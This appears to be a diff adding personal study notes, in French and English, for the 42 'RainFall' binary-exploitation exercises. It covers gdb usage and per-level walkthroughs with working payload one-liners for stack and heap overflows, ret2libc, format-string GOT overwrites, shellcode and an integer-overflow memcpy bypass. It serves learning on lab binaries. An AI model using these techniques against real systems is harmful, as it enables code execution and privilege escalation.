@@ -1,0 +1,215 @@
+https://github.com/kibotrel/42-Rainfall/blob/main/level0/Ressources/gdb.md
+https://github.com/maxisimo/42-RainFall/tree/main/level0
+https://github.com/alexandre-hallaine/Rainfall/blob/main/level2/walkthrough.md
+https://github.com/maxisimo/42-RainFall/blob/main/level2/walkthrough.md
+
+
+-gdb level (ouvre gdb pour le programme passe en arg)
+-b *<add> breakpoint a une adresse
+-run <arg> <arg>
+-info function
+-layout asm (ouvre asm en haut ou on peut naviguer et gdb en bas)
+-gdb level puis run < /nomfichier input (ouvre gdb et lance le programme avec l'argument passe a run)
+-disas <nom fonction> afficher l'asm pour 1 fonction
+-cat /file - | ./level : We have a little trick with cat to keep stdin open, so /bin/sh will keep listening to stdin and execute whatever is sent through it
+-python -c '<code python>' > /file/exploit
+-[::-1] : gdb nous donne en big indian donc il faut inverser
+-Trouver offset overflow : utiliser un pattern generator le placer dans 1 fichier et appeler le program en lui passant (run < /nomfichier), gdb donne l'adresse de segfault qui correspont a 1 caracter du pattern, quand on passe ce caractere au site de pattern on arrive a calculer l'offset par sa position parmis les caractere uniques du pattern. Tout ce qui est apres cet offset va etre execute comme du code
+-Ret2libc : Si pas d'appel system dans le programme, on utilisera l'adresse de system de la libc qui est chargee en memoire pendant la duree de l'execution du programme
+-Ret2Ret method is overwrite EIP with a ret instruction and put after the address we want. The ret instruction will pop the stack and take the second address. Usefull for bypass this check
+-break <fonction ou adresse> pour mettre un breakpoint dans gdb, c pour continuer 
+-info address <func name> : donne l'adresse de la fonction
+-info frame
+-info variable : on peut y voir les varialbe globale
+-info registers : donne le contenu des registre (eip, eax, edx ...)
+-plt : procedure linkage table, ca veut dire que c'est un appel a une autre fonction, pas une fonction qui est a compiler car elle existe deja dans le system pour faire une porgramme moins gros
+-GOT: global offset table is a table of addresses in the data section, it contains the shared library functions addresses, is writable and whenever the function exitplt() is called (GOT entry of the function is looked up first) the program will jump to that address.
+-A shell code is a set of instructions that makes something we want : example execute a shell. We inject it to a programm
+
+ASM: 
+preserve stack frame: 
+push ebp
+mov esp, ebp
+
+0x08048ec3 <+3>:     and    esp,0xfffffff0
+0x08048ec6 <+6>:     sub    esp,0x20
+:Stack align on 16 bytes unnecessary, because there are no SIMD instructions
+:32 bytes are allocated to the main function for its local variables.
+
+   │0x8048ec9 <main+9>      mov    0xc(%ebp),%eax                                                                                     │
+   │0x8048ecc <main+12>     add    $0x4,%eax                                                                                          │
+   │0x8048ecf <main+15>     mov    (%eax),%eax                                                                                        │
+:Store directly the value of argv + 1 (argv[1]) in eax, so eax is now a pointer.
+
+   │0x8048ed1 <main+17>     mov    %eax,(%esp)                                                                                        │
+   │0x8048ed4 <main+20>     call   0x8049710 <atoi>                                                                                   │
+:Store eax (argv[1]) at the address of esp (the top of the stack).
+:Call to atoi() which will take as argument the value stored at the address of esp (atoi(argv[1])).
+
+eax : return register
+
+	lea    0x10(%esp),%eax 
+:So, this instruction is loading the effective address of the memory location pointed to by %esp plus 16 (0x10) into the %eax register. This is a common operation in x86 assembly language for accessing variables or parameters passed to a function stored on the stack
+
+EIP, or Index Pointer, register contains the memory address where the next instruction to be executed is located
+
+   x/i — CPU instruction
+   x/s — C string (NULL terminated)
+   x/x — integer as hex
+print/d 0x<decimal> : converti en decimal un hexa 
+
+x/80x $esp will print 80 int (4 byte) values from the top of the stack — the number after the forward slash indicates how many items to display
+x/20wx $sp (voir les 20 dernieres adresses de la stack depuis mon breakpoint)
+
+-x/30s *((char**)environ) : affiche 30 str de var denvironnement
+-x/200wx <adress> : affiche 200 adresses a partir de adresse
+
+____________________________________________________________________
+
+Level0: 
+Va faire un excve /bin/sh si le retour de atoi de argv est 423
+
+                                                                                       
+Level1:
+Remplacer le ret du main par l'adresse de la fonction run (qui execute une system bin/sh mais n'est pas appelee). Pour faire ca, utiliser gets qui est vulnerable au buffer overflow (utiliser un pattern generator pour trouver l'offset). Envoyer au programme caracter * offset + adresse de run
+
+Level02:
+Le programme n'appelle pas system, on va utiliser un ret2libc a la fonction system chargee en memoire. Mais il ya une protection pour verifier que l'adresse de retour n'est pas stocke dans le stack (0xb)? sinon exit. On va donc devoir utiliser un ret2ret (cf plus haut).
+On va donc faire un overflow et y placer l'adresse de retour de p (pour passer la protection ou de main peut importe), suivie de l'adresse de system qu'on aura prealablement trouvee, puis l'argument /bin/sh ( On place 4octets entre les deux car l'ordre de la pile est le suivant:
+-function address : system
+-return address : on pourrait placer exit si on veut que le programme finisse normalement sinon du garbage)
+-parameters : bin/sh)
+Pour trouver l'adresse de system et /bin/sh le programme doit etre running pour que la libc soit chargee en memoire
+info function system
+ info proc mappings
+[...]
+0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+[...]
+(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
+
+Level03: On a un systeme bin sh qui est execute uniquement si m == 64.
+Printf peut etre exploité si utilisé sans chaine de parsage. Si on lui passe des % en tant que string il va les interpreter %x il va afficher premiere adresses  qu'il trouve (car normalement elle sont passee en arg a printf), %3$x va afficher que la 3e adresse   
+Avec %n il va compter le nombre d'octets qui le precede et les ecrire a l'adresse en "paremetre" et avec %<x>$n il ecrit a la xieme adresse
+m n'est pas accessible, on veut donc ecrire l'adresse de m dans le buffer puis passer en x la position du buffer pour qu'il ecrive a l'adresse de m qui sy trouvera
+POur trouver l'adresse du buffer : on ecrit AAAA(41414141) puis on affiche les adresses, il est en 4e pos
+(python -c 'print "AAAA" + " %x " + " %x " + " %x " + " %x " + " %x " + " %x "' > /tmp/whereIsMyBuff
+$ cat /tmp/whereIsMyBuff | ./level3
+AAAA 200  b7fd1ac0  b7ff37d0  41414141  20782520  20782520)
+On passe donc l'adresse de m puis le nombre d'octets restant a ecrire (pour atteindre 64) suivi de la position de l'adresse
+python -c 'print "\x08\x04\x98\x8c"[::-1] + 60 * "A" + "%4$n"' > /tmp/exploit3
+$ cat /tmp/exploit3 - | ./level3
+
+level04: meme conf et resolution que le 3 sauf que m devra etre = a 16millions d'octets et trop long, va faire un brocken pipe, on va donc utiliser du padding pour ecrire notre nombre d'octet sans avoir de broken pipe
+Le system fera un cat du mdp
+
+level05: We can't rewrite EIP, cause the program will exit before. We can replace the address of exit in the GOT with the address of "o", for calling it instead of exit.
+On veut utiiser la faille de printf pour remplacer ce vers quoi pointe la GOT du exitplt (initialement exit) par la func "o" (qui contient system bin/sh).
+On va donc utiliser le %n pour ecrire l'adresse de o la place celle de exit, on converti l'adresse de o en decimal pour savoir combien d'octets ecrire. Puis il faut trouver l'adresse vers quoi jump exitplt dans la GOT car celle ci pointe pour l'instant vers exit (c'est cette adresse qu'on veut passer comme pointeur a %n pour qu'elle pointe vers o au lieu de exit)
+On utilise x/i <adresse exitplt> (donne l'instruction )pour savoir a quelle adresse ou doit ecrire avec le printf
+On doit egalement trouver la position de notre buffer : on met un breakpoint au printf car on veut connaitre la position du buffer par rapport au printf, puis en lance run puis AAAA et on regarde les 20 dernieres adresses de la stack : x/20wx $sp
+
+level06: on utiliser  exploit strcpy pour faire un overflow, en ecrivant plus que la taille allouee.
+Une fonction m est placee dans un pointeur alloué puis appel a strcpy avec en arg agv[1]. On va faire une overflow avec strcp pour ecraser eip et rediriger vers la func n qui cat le mdp.
+
+level07: On a un fgets qui put le result d'un fopen du fichier mdp vers un globale str "c". "m" est une func non appellée qui affiche le contenu de "c". On veut que m soit appellée après le fget pour que c contienne le mdp. Comme putsplt est appellée a la fin du prog on veut reecrire le contenu de l'adresse qui pointe vers puts dans la GOT pour qu'elle pointe vers m.
+On veut remplacer le premier argmument du strcpy2 (dest) par l'adresse GOT de puts et on veut que son deuxieme argument soit l'adresse de m (comme ca le 2em strcpy var remplacer l'adresse de put par m) pour ca on va se servir de l'overflow du strcpy1
+En testant l'overflow sur strcpy1 (on lui passe AAAABBBBCCCCEEEEFFFF en arg1) on constate que ce n'est pas eip qui est ecrasé mais eax (on le voit avec info registers) au niveau du FFFF ce qui nous donne egalement l'offset. Or en mettant un breakpoint avec le strcpy2 on constate que eax contient le 1er arg du strcpy2 soit la dest, donc on veut que eax contienne l'adresse de put
+Donc en premier argument on ecrira l'offset + adresse de puts et en deuxieme argument on ecrira l'adresse de m 
+
+On se rend compte que c'est v5[1](pointeur dest de strcpy2) quon va ovewrite (il sera ensuite contenu dans eax pour etre envoye dans strcpy)
+Let's get the offset necessary to overwrite v5[1] by using ltrace to print libc calls.
+level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+__libc_start_main(0x8048521, 2, 0xbffff784, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                       = 0x0804a008
+malloc(8)                                                       = 0x0804a018
+malloc(8)                                                       = 0x0804a028
+malloc(8)                                                       = 0x0804a038
+strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)       = 0x0804a018
+strcpy(0x37614136, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+Level08:  After analysis, we understand that there are two global variables which are printed each time we input something.The first is called auth and the other one is service.
+The input is compared to the following : 
+-auth allocates 4 bytes for the auth variable then and copies the rest of the input within the variable if its length is less thant 32 bytes.
+-reset will free() the auth variable.
+-service will use strdup() on the rest of the input an stores it inside service.
+-login will either prompt us a message or give us a shell if auth[32] != 0
+Each time we type a command we have the address of auth and service printed which allow us to know they are separated by 16bytes
+Since we know that auth and service are close in memory, we will initialize auth then write a string long enough in service to reach auth[32] (16byte ("service" included)) before typing login
+
+level09:  Programm en cpp avec un objet N qui a  un buffer annotion[100] et une fonction setannocation qui rempli ce buffer avec un memcopy de argv[1] This time we're facing a C++ program with some class method using memcpy() which is known to be exploitable since no overlaping checks are made. On voit que le programme execute une fonction stockee dans edx (call *edx), On veut utiliser l'overflow de memcpy qui va override eax car eax sera ensuite utilisé pour set edx. Comme on veut que ce soit notre shell code qui soit execute on va y mettre l'adresse de notre shellcode. Cependant comme eax va etre dereference du fois on va mettre l'adresse de notre buffer +4  puis puis l'adresse du shell code puis le nombre a overflow puis l'adresse de notre buffer 
+
+bonus0:
+void p(char *str, char *str_dash)
+{
+    char read_buf[4096];
+
+    puts(str_dash);
+    read(0, read_buf, 4096);
+    *strchr(read_buf, '\n') = 0;
+    strncpy(str, read_buf, 20);
+}
+
+void pp(char *buf_main)
+{
+    char buf[20];
+    char buf2[20];
+
+    p(buf2, " - ");
+    p(buf, " - ");
+
+    strcpy(buf_main, buf2);
+
+    buf_main[strlen(buf_main)] = ' ';
+
+    strcat(buf_main, buf);
+}
+
+int main()
+{
+    char buf_main[42];
+
+    pp(buf_main);
+    puts(buf_main);
+
+    return 0;
+}
+
+It reads input using the read function, the null terminator is then added with strchr and the string is copied to the buf or buf2 buffer using strncpy with a size of 20. However, the strncpy function doesn't add a null terminator if the string is longer than the size provided. Therefore, the buf or buf2 buffer will not be null terminated
+
+This will result in strcpy copying the buf2 buffer to the buf_main buffer, but it will not stop at the null terminator, since there is none, it will continue to copy the buf buffer to the buf_main buffer (because they are contigus in memrory). Then strcat will append the buf buffer to the buf_main buffer which will allow us to overflow the buffer and overwrite the return address of the main function. It will overflow because we will concatenate a string which is not null terminated.
+To find overflow 
+-
+AAAABBBBCCCCEEEEFFFFGGGGHHHH
+-
+aaaabbbbcccceeeeffffgggghhhh (9e octet du deuxieme buffer) 
+We need to use a Shellcode in this situation because our buffer are 20 bytes long, we need 12 bytes at minimum to perform a ret2libc attack as we did previously but we only have 11 bytes here.
+As we will overwrite the return address we will put in eip the adress of our shell code. As we dont have enough place to put it in a 20 octets buffer we will put it in environ vars. As environ vars change of addresses from time to time we will place NOP and give an address in middle of the NOPs so it will slide till shellcode
+Pour pouvoir ecrire les deux argument dans un fichier avec python -c on va faire lire de la taille du buffer comme ca le read va se fermer, il faut quon depasse plus que de 4 octed pour que ca segfault on ajoute 8octet supp
+
+bonus1:
+int main(int argc,char **argv) 
+{
+    char		buffer[40];
+    int 		number;
+
+    number = atoi(argv[1]); //-1073741813
+    if (number > 9) {
+        return (1);
+    }
+    memcpy(buffer, argv[2], number * 4); // number * 4 = -1073741813 * 4 = -4294967252
+    if (number == 1464814662) {   //0x574f4c46
+      execl("/bin/sh", "sh", 0);
+    }
+  return (0);
+}
+On veut que number soit == 1464814662 pour faire le exec /bin/sh. Ce nombre est le result de atoi(argv[1]) et on ne peut pas passer un nb >9 sinon le programme quitte.
+On veut donc override (par le nb attendu en hexa) number en utilisant un overflow de memcopy. Cependant comme memcpy limite la copie a 4 * nb soit max 36 on ne peux pas l'atteindre. 
+On voit en regardant les adresse dans gdb que l'adresse de nb est 40 octet apres le debut de notre destination de memcpy, donc il nous faut faire un memcpy de 44(40 +adresse)
+On va donc utiliser le fait que le system soit en 32bits
+Car si l'on passe un argument en binaire de 64 bit il ne prendra que les 32 de droite
+1111111111111111 1111111111111111 0000000000000000 0000000000000001 sera considéré comme 1 alors que 
+Comme un veut une taille de 44 on veut que nb? * 4 == 44 en binaire
+1111111111111111 1111111111111111 0000000000000000 0000000000101100 sera considéré comme 44 par le memcpy alors que -4294967252. On veut donc que nb * 4 soit egal a ce nb soit en argv[1] on passera -4294967252/4 = -1073741813 et en deuxieme arg l'overflow
+./bonus1 -1073741813 $(python -c 'print "A" * 40 + "\x57\x4f\x4c\x46"[::-1]') 
